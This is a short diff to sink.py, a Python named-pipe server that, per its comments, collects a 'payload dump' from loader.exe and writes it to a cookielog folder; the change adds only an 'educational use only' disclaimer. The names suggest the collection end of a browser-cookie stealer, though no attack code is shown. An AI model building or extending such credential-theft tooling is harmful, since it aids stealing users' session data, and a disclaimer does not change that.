@@ -1,6 +1,9 @@
 # sink.py -- server for \\.\pipe\ck_pipe: receives the payload dump and writes it to disk.
 #          Run BEFORE loader.exe: the payload waits ~10 s and, with nobody on the other side,
 #          dumps everything to C:\ProgramData\cookielog\drop.json outside the reports.
+#
+#   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING.
+#   Only use on systems you own or are explicitly authorized to test.
 import ctypes, json, os, time
 from ctypes import wintypes
 
